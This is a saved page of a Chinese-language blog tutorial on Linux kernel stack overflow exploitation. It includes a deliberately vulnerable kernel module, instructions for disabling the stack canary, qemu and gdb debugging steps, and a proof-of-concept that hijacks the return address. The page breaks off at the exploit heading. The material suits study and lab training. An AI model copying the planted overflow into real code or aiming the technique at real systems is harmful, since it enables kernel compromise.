@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<title>linux-kernel expoit  study (3)---栈溢出 | Swings'Blog|浮生若梦|CTFer|Binary|Python</title>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
+<meta content="栈溢出 内核漏洞" name="description"/>
+<meta content="article" property="og:type"/>
+<meta content="linux-kernel expoit  study (3)---栈溢出" property="og:title"/>
+<meta content="http://bestwing.me/2017/04/10/write-kernel-exploits-2/index.html" property="og:url"/>
+<meta content="Swings'Blog|浮生若梦|CTFer|Binary|Python" property="og:site_name"/>
+<meta content="栈溢出 内核漏洞" property="og:description"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/40403533-file_1492093864003_ee9.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/65363729-file_1492093908470_7027.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/27062755-file_1492093925057_9ca1.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/47529411-file_1492093896561_aae6.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/80798469-file_1492093989244_2fb3.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/78886600-file_1492097241881_53a1.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/47529411-file_1492093896561_aae6.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/80798469-file_1492093989244_2fb3.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/68093852-file_1492098164648_7eb3.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/10481050-file_1492098183610_f2e1.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/91719404-file_1492098210807_5828.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/81992979-file_1492098238167_a8ad.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/85791643-file_1492098270927_145d1.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/85791643-file_1492098270927_145d1.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/1066069-file_1492098308885_159b4.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/18249508-file_1492098327950_f58f.png" property="og:image"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/90619683-file_1492098345979_2d08.png" property="og:image"/>
+<meta content="2017-04-13T15:48:11.652Z" property="og:updated_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="linux-kernel expoit  study (3)---栈溢出" name="twitter:title"/>
+<meta content="栈溢出 内核漏洞" name="twitter:description"/>
+<meta content="http://oayoilchh.bkt.clouddn.com/17-4-13/40403533-file_1492093864003_ee9.png" name="twitter:image"/>
+<link href="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/atom.xml" rel="alternative" title="Swings'Blog|浮生若梦|CTFer|Binary|Python" type="application/atom+xml"/>
+<link href="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/98028288-file_1488275496708_10f1d.jpg" rel="icon"/>
+<link href="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/animate.min.css" rel="stylesheet"/>
+<link href="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/style.css" rel="stylesheet"/>
+<link href="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/font-awesome.min.css" rel="stylesheet"/>
+<link href="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/apple-touch-icon.png" rel="apple-touch-icon"/>
+<link href="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/jquery.fancybox.css" rel="stylesheet"/>
+<!-- 加载特效 -->
+<script src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/pace.js"></script>
+<link href="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/pace-theme-flash.css" rel="stylesheet">
+<script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</link></head>
+<body>
+<div id="container">
+<div class="left-col">
+<div class="overlay"></div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="js-avatar" lazy-src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/180526%20"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/">Swing|浮生若梦</a></h1>
+</hgroup>
+<p class="header-subtitle">努力是为了 站在万人中央 成为别人的光</p>
+<div class="switch-btn" id="switch-btn">
+<div class="icon">
+<div class="icon-ctn">
+<div class="icon-wrap icon-house" data-idx="0">
+<div class="birdhouse"></div>
+<div class="birdhouse_holes"></div>
+</div>
+<div class="icon-wrap icon-ribbon hide" data-idx="1">
+<div class="ribbon"></div>
+</div>
+<div class="icon-wrap icon-link hide" data-idx="2">
+<div class="loopback_l"></div>
+<div class="loopback_r"></div>
+</div>
+<div class="icon-wrap icon-me hide" data-idx="3">
+<div class="user"></div>
+<div class="shoulder"></div>
+</div>
+</div>
+</div>
+<div class="tips-box hide">
+<div class="tips-arrow"></div>
+<ul class="tips-inner">
+<li>菜单</li>
+<li>标签</li>
+<li>友情链接</li>
+<li>关于我</li>
+</ul>
+</div>
+</div>
+<div class="switch-area" id="switch-area">
+<div class="switch-wrap">
+<section class="switch-part switch-part1">
+<nav class="header-menu">
+<ul>
+<li><a href="http://bestwing.me">博客首页</a></li>
+<li><a href="/archives/">文章归档</a></li>
+<li><a href="/about">留言打卡</a></li>
+<li><a href="/CTF-Study">学习导航</a></li>
+<li><a href="/PWNABLE">PWNABLE</a></li>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fl mail" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" target="_blank" title="mail">mail</a>
+<a class="fl github" href="https://github.com/WinMin" target="_blank" title="github">github</a>
+<a class="fl zhihu" href="https://www.zhihu.com/people/swing-57-29/activities" target="_blank" title="zhihu">zhihu</a>
+<a class="fl twitter" href="https://twitter.com/bestswngs" target="_blank" title="twitter">twitter</a>
+<a class="fl rss" href="/atom.xml" target="_blank" title="rss">rss</a>
+</ul>
+</nav>
+</section>
+<section class="switch-part switch-part2">
+<div class="widget tagcloud" id="js-tagcloud">
+<a href="/tags/0CTF/" style="font-size: 10px;">0CTF</a> <a href="/tags/360春秋杯/" style="font-size: 10px;">360春秋杯</a> <a href="/tags/Bin/" style="font-size: 10px;">Bin</a> <a href="/tags/Book/" style="font-size: 10px;">Book</a> <a href="/tags/CCTF/" style="font-size: 10px;">CCTF</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12px;">Crypto</a> <a href="/tags/DEFCON/" style="font-size: 10px;">DEFCON</a> <a href="/tags/ELF/" style="font-size: 10px;">ELF</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/Hexo/" style="font-size: 18px;">Hexo</a> <a href="/tags/John/" style="font-size: 10px;">John</a> <a href="/tags/Kcon/" style="font-size: 10px;">Kcon</a> <a href="/tags/Linux-kernel/" style="font-size: 16px;">Linux-kernel</a> <a href="/tags/Markdown/" style="font-size: 10px;">Markdown</a> <a href="/tags/Misc/" style="font-size: 10px;">Misc</a> <a href="/tags/NJCTF/" style="font-size: 10px;">NJCTF</a> <a href="/tags/NUCA/" style="font-size: 12px;">NUCA</a> <a href="/tags/PCTF/" style="font-size: 10px;">PCTF</a> <a href="/tags/Pwn/" style="font-size: 20px;">Pwn</a> <a href="/tags/Pwntools/" style="font-size: 10px;">Pwntools</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/Reverse/" style="font-size: 18px;">Reverse</a> <a href="/tags/SSTF/" style="font-size: 10px;">SSTF</a> <a href="/tags/SUCTF/" style="font-size: 10px;">SUCTF</a> <a href="/tags/Think/" style="font-size: 14px;">Think</a> <a href="/tags/Tools/" style="font-size: 10px;">Tools</a> <a href="/tags/VPN/" style="font-size: 10px;">VPN</a> <a href="/tags/Web/" style="font-size: 12px;">Web</a> <a href="/tags/WiFi/" style="font-size: 10px;">WiFi</a> <a href="/tags/Writeup/" style="font-size: 14px;">Writeup</a> <a href="/tags/angry/" style="font-size: 10px;">angry</a> <a href="/tags/exploit/" style="font-size: 10px;">exploit</a> <a href="/tags/i春秋-百度杯/" style="font-size: 14px;">i春秋-百度杯</a> <a href="/tags/i春秋-腾讯30强/" style="font-size: 12px;">i春秋-腾讯30强</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a> <a href="/tags/wooyun/" style="font-size: 10px;">wooyun</a> <a href="/tags/上海省赛/" style="font-size: 10px;">上海省赛</a> <a href="/tags/华山杯CTF/" style="font-size: 10px;">华山杯CTF</a> <a href="/tags/科学上网/" style="font-size: 10px;">科学上网</a> <a href="/tags/陕西省赛/" style="font-size: 10px;">陕西省赛</a>
+</div>
+</section>
+<section class="switch-part switch-part3">
+<div id="js-friends">
+<a class="main-nav-link switch-friends-link" href="http://ring3.xyz/" target="_blank">Yllen</a>
+<a class="main-nav-link switch-friends-link" href="http://mxny.org/" target="_blank">麦香浓郁</a>
+<a class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/" target="_blank">K0sh1</a>
+<a class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/" target="_blank">信鑫</a>
+<a class="main-nav-link switch-friends-link" href="http://bystudent.com/" target="_blank">ByStundet表哥</a>
+<a class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/" target="_blank">汪神_Jarvis</a>
+<a class="main-nav-link switch-friends-link" href="http://sh3ll.me/" target="_blank">Chu</a>
+<a class="main-nav-link switch-friends-link" href="https://www.hackfun.org/" target="_blank">4ido10n</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy" target="_blank">L3m0n</a>
+<a class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/" target="_blank">muhe</a>
+<a class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/" target="_blank">_画船听雨</a>
+<a class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html" target="_blank">Virink</a>
+<a class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/" target="_blank">国光</a>
+<a class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/" target="_blank">老锥</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cizel.cn/" target="_blank">C1zel</a>
+<a class="main-nav-link switch-friends-link" href="http://1phan.cc" target="_blank">1phan</a>
+<a class="main-nav-link switch-friends-link" href="https://www.liuil.top/" target="_blank">liuil</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/" target="_blank">Ox9A82</a>
+<a class="main-nav-link switch-friends-link" href="http://burnegg.com/" target="_blank">burnegg</a>
+<a class="main-nav-link switch-friends-link" href="https://jwrsec.cn/" target="_blank">jwr-sec</a>
+<a class="main-nav-link switch-friends-link" href="http://sudalover.cn/" target="_blank">苏打</a>
+<a class="main-nav-link switch-friends-link" href="http://blog.binklac.com" target="_blank">VeroFess</a>
+<a class="main-nav-link switch-friends-link" href="http://www.bendawang.site/" target="_blank">bendawang</a>
+<a class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/" target="_blank">hook</a>
+</div>
+</section>
+<section class="switch-part switch-part4">
+<div id="js-aboutme">我想一年后再来写这个 2016年9月4日</div>
+</section>
+</div>
+</div>
+</header>
+</div>
+</div>
+<div class="mid-col">
+<nav id="mobile-nav">
+<div class="overlay">
+<div class="slider-trigger"></div>
+<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Swing|浮生若梦</a></h1>
+</div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="js-avatar" lazy-src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/180526%20"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="回到主页">Swing|浮生若梦</a></h1>
+</hgroup>
+<p class="header-subtitle">努力是为了 站在万人中央 成为别人的光</p>
+<nav class="header-menu">
+<ul>
+<li><a href="http://bestwing.me">博客首页</a></li>
+<li><a href="/archives/">文章归档</a></li>
+<li><a href="/about">留言打卡</a></li>
+<li><a href="/CTF-Study">学习导航</a></li>
+<li><a href="/PWNABLE">PWNABLE</a></li>
+<div class="clearfix"></div>
+</ul>
+</nav>
+<nav class="header-nav">
+<div class="social">
+<a class="mail" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" target="_blank" title="mail">mail</a>
+<a class="github" href="https://github.com/WinMin" target="_blank" title="github">github</a>
+<a class="zhihu" href="https://www.zhihu.com/people/swing-57-29/activities" target="_blank" title="zhihu">zhihu</a>
+<a class="twitter" href="https://twitter.com/bestswngs" target="_blank" title="twitter">twitter</a>
+<a class="rss" href="/atom.xml" target="_blank" title="rss">rss</a>
+</div>
+</nav>
+</header>
+</div>
+</nav>
+<div class="body-wrap"><article class="article article-type-post" id="post-write-kernel-exploits-2" itemprop="blogPost" itemscope="">
+<div class="article-meta">
+<a class="article-date" href="/2017/04/10/write-kernel-exploits-2/">
+<time datetime="2017-04-09T16:00:00.000Z" itemprop="datePublished">2017-04-10</time>
+</a>
+</div>
+<div class="article-inner">
+<input class="isFancy" type="hidden"/>
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+      linux-kernel expoit  study (3)---栈溢出
+    </h1>
+</header>
+<div class="article-info article-info-post">
+<div class="article-category tagcloud">
+<a class="article-category-link" href="/categories/Binary/">Binary</a>
+</div>
+<div class="article-tag tagcloud">
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux-kernel/">Linux-kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>
+</div>
+<div class="clearfix"></div>
+</div>
+<div class="article-entry" itemprop="articleBody">
+<h1 id="write-linux-kernel-exploit-2"><a class="headerlink" href="#write-linux-kernel-exploit-2" title="write linux kernel exploit 2"></a>write linux kernel exploit 2</h1><h2 id="Stack-smashing"><a class="headerlink" href="#Stack-smashing" title="Stack smashing"></a>Stack smashing</h2><blockquote>
+<p>简单的内核栈溢出</p>
+</blockquote>
+<h2 id="一个简单的demo"><a class="headerlink" href="#一个简单的demo" title="一个简单的demo"></a>一个简单的demo</h2><blockquote>
+<p>漏洞很明显，memcpy没有对长度进行判断</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">$ vim stack_smashing.c</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bug2_write</span><span class="params">(<span class="keyword">struct</span> file *file,<span class="keyword">const</span> <span class="keyword">char</span> *buf,<span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></div><div class="line">{</div><div class="line">	<span class="keyword">char</span> localbuf[<span class="number">8</span>];</div><div class="line">	<span class="built_in">memcpy</span>(localbuf,buf,len);</div><div class="line">	<span class="keyword">return</span> len;</div><div class="line">}</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> <span class="number">__</span><span class="function">init <span class="title">stack_smashing_init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">{</div><div class="line">	printk(KERN_ALERT <span class="string">"stack_smashing driver init!\n"</span>);</div><div class="line">	create_proc_entry(<span class="string">"bug2"</span>,<span class="number">0666</span>,<span class="number">0</span>)-&gt;write_proc = bug2_write;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">}</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="number">__</span><span class="function"><span class="built_in">exit</span> <span class="title">stack_smashing_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">{</div><div class="line">	printk(KERN_ALERT <span class="string">"stack_smashing driver exit!\n"</span>);</div><div class="line">}</div><div class="line"></div><div class="line">module_init(stack_smashing_init);</div><div class="line">module_exit(stack_smashing_exit);</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ko文件的Makefile, KERNELDR目录设置为linux内核源码的根目录即可</div><div class="line">obj-m := stack_smashing.o  </div><div class="line">KERNELDR := ~/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>  </div><div class="line">PWD := $(shell pwd)  </div><div class="line">modules:  </div><div class="line">	$(MAKE) -C $(KERNELDR) M=$(PWD) modules  </div><div class="line">moduels_install:  </div><div class="line">	$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  </div><div class="line">clean:  </div><div class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</div></pre></td></tr></table></figure>
+<h2 id="简单的测试"><a class="headerlink" href="#简单的测试" title="简单的测试"></a>简单的测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">qemu启动内核，加载相关的busybox</div><div class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append <span class="string">"root=/dev/sda</span></div><div class="line"></div><div class="line">&gt;加载模块</div><div class="line">$ insmod stack_smashing.ko</div></pre></td></tr></table></figure>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/40403533-file_1492093864003_ee9.png"/><br/>POC测试</p>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/65363729-file_1492093908470_7027.png"/></p>
+<blockquote>
+<p>发现此时编译的ko是有canary检测了，为了测试方便，需要关闭栈保护机制，可以修改~linux_kernel/linux-2.6.32.1中的配置文件.config，找到CONFIG_CC_STACKPROTECTOR注释掉即可，然后重新编译内核和ko文件<br/><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/27062755-file_1492093925057_9ca1.png"/><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">关闭CONFIG_CC_STACKPROTECTOR之后重新测试栈溢出</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h2 id="调试模块"><a class="headerlink" href="#调试模块" title="调试模块"></a>调试模块</h2><blockquote>
+<p>由于模块并没有作为vmlinux的一部分传给gdb，因此必须通过某种方法把模块信息告知gdb，可以通过add-symbol-file命令把模块的详细信息告知gdb，由于模块也是一个elf文件，需要知道模块的.text、.bss、.data节区地址并通过add-symbol-file指定。<br/>模块stack_smashing.ko的这三个信息分别保存在/sys/module/stack_smashing/sections/.text、/sys/module/stack_smashing/sections/.bss和/sys/module/stack_smashing/sections/.data，由于stack_smashing模块没有bss、data节区所以只需要指定text即可。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">获取text节区地址</div><div class="line">$ grep 0 /sys/module/stack_smashing/sections/.text</div></pre></td></tr></table></figure>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/47529411-file_1492093896561_aae6.png"/><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">在gdb中添加模块信息</div><div class="line">gdb-peda$ add-symbol-file /home/swing/linux_kernel/write_linux_kernel_exploit/stack_smashing/stack_smashing.ko 0xc8830000</div><div class="line"></div><div class="line">如果存在data和bss节区可以如下指定：</div><div class="line">gdb-peda$ add-symbol-file /home/swingr/linux_kernel/write_linux_kernel_exploit/stack_smashing/stack_smashing.ko 0xc8830000 <span class="_">-s</span> .bss xxxx <span class="_">-s</span> .data xxxx</div></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">对漏洞函数下断点，可以看到bug2_write在模块中的偏移是0x30，所以在0xc8830000+0x30处下断点</div><div class="line">gdb-peda$ b bug2_write</div><div class="line">Breakpoint 1 at 0x30: bug2_write. (2 locations)</div><div class="line">gdb-peda$ b *0xc8830030</div></pre></td></tr></table></figure>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/80798469-file_1492093989244_2fb3.png"/></p>
+<h2 id="具体调试步骤"><a class="headerlink" href="#具体调试步骤" title="具体调试步骤"></a>具体调试步骤</h2><p>调试模式启动kernel<br/><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ qemu-system-i386 -S -kernel <span class="keyword">arch</span>/i386/<span class="keyword">boot</span>/bzImage -hda /tmp/my.img -<span class="keyword">append</span> <span class="string">"root=/dev/sda"</span></div></pre></td></tr></table></figure></p>
+<p>设置qemu gdbserver(Ctrl+Alt+2)<br/><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(qemu) gdbserver tcp::<span class="number">1234</span></div></pre></td></tr></table></figure></p>
+<p>gdb调试kernel<br/><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>gdb vmlinux</div><div class="line">gdb-peda<span class="variable">$ </span>target remote <span class="symbol">localhost:</span><span class="number">1234</span></div><div class="line">gdb-peda<span class="variable">$ </span>c</div></pre></td></tr></table></figure></p>
+<p>继续运行qemu(Ctrl+Alt+1)</p>
+<p>在启动的内核中加载模块<br/><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>insmod stack_smashing.ko</div></pre></td></tr></table></figure></p>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/78886600-file_1492097241881_53a1.png"/><br/>找到模块stack_smashing的text地址<br/><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ grep <span class="number">0</span> /sys/<span class="class"><span class="keyword">module</span>/<span class="title">stack_smashing</span>/<span class="title">sections</span>/.<span class="title">text</span></span></div><div class="line"><span class="number">0xc8830000</span></div></pre></td></tr></table></figure></p>
+<p>在gdb中command＋c停止kernel运行加载符号并设置断点<br/><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ c</div><div class="line">Continuing.</div><div class="line">^C</div><div class="line"></div><div class="line">gdb-peda$ <span class="keyword">file</span> vmlinux</div><div class="line">Reading symbols <span class="keyword">from</span> vmlinux...done.</div><div class="line"></div><div class="line">gdb-peda$ add-symbol-<span class="keyword">file</span> <span class="regexp">/home/</span>joker<span class="regexp">/linux_kernel/</span>write_linux_kernel_exploit<span class="regexp">/stack_smashing/</span>stack_smashing.ko <span class="number">0</span>xc8830000</div><div class="line">add symbol table <span class="keyword">from</span> <span class="keyword">file</span> <span class="string">"/home/joker/linux_kernel/write_linux_kernel_exploit/stack_smashing/stack_smashing.ko"</span> at</div><div class="line">	.text_addr = <span class="number">0</span>xc8830000</div><div class="line">Reading symbols <span class="keyword">from</span> <span class="regexp">/home/</span>joker<span class="regexp">/linux_kernel/</span>write_linux_kernel_exploit<span class="regexp">/stack_smashing/</span>stack_smashing.ko...done.</div></pre></td></tr></table></figure></p>
+<p>添加断点<br/><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ <span class="selector-tag">b</span> bug2_write</div></pre></td></tr></table></figure></p>
+<p>qemu中触发漏洞<br/>$ echo ABCDEFGHIJKLMNOPQRSTUVWXYZ &gt; /proc/bug2</p>
+<p>进入gdb中调试<br/>gdb-peda$ s<br/>Warning: not running or target is remote<br/>9        memcpy(localbuf,buf,len);</p>
+<p>gdb-peda$ x /20i $eip<br/>=&gt; 0xc883000f <bug2_write+15>:    mov    esi,edx<br/>   0xc8830011 <bug2_write+17>:    shr    ecx,0x2<br/>   0xc8830014 <bug2_write+20>:    lea    edi,[ebp-0x10]<br/>   0xc8830017 <bug2_write+23>:    rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]<br/>   0xc8830019 <bug2_write+25>:    mov    ecx,eax<br/>   0xc883001b <bug2_write+27>:    and    ecx,0x3<br/>   0xc883001e <bug2_write+30>:    je     0xc8830022 <bug2_write+34><br/>   0xc8830020 <bug2_write+32>:    rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]<br/>   0xc8830022 <bug2_write+34>:    add    esp,0x8<br/>   0xc8830025 <bug2_write+37>:    pop    esi<br/>   0xc8830026 <bug2_write+38>:    pop    edi<br/>   0xc8830027 <bug2_write+39>:    pop    ebp<br/>   0xc8830028 <bug2_write+40>:    ret<br/>可以看到memcpy已经被编译器优化为rep movs指令</bug2_write+40></bug2_write+39></bug2_write+38></bug2_write+37></bug2_write+34></bug2_write+32></bug2_write+34></bug2_write+30></bug2_write+27></bug2_write+25></bug2_write+23></bug2_write+20></bug2_write+17></bug2_write+15></p>
+<p>在函数返回处下断点<br/>gdb-peda$ b *0xc8830028<br/>gdb-peda$ c<br/>gdb-peda$ x /10i $eip<br/>=&gt; 0xc8830028 <bug2_write+40>:    ret    </bug2_write+40></p>
+<p>可以看到此时ret之后控制eip为0x58575655<br/>gdb-peda$ x /wx $esp<br/>0xc7a63f30:    0x58575655</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">poc</div><div class="line">$ cat stack_smashing_poc.c</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">{</div><div class="line">	<span class="keyword">char</span> buf[<span class="number">24</span>];</div><div class="line">        <span class="built_in">memset</span>(buf,<span class="string">'A'</span>,<span class="number">24</span>);</div><div class="line">        *((<span class="keyword">void</span>**) (buf+<span class="number">20</span>)) = <span class="number">0x43434343</span>;</div><div class="line">        <span class="comment">//write(1,buf,sizeof(buf));</span></div><div class="line">        <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug2"</span>, O_WRONLY);</div><div class="line">        write(fd, buf, <span class="keyword">sizeof</span>(buf));</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
+<h2 id="exp"><a class="headerlink" href="#exp" title="exp"></a>exp</h2><blockquote>
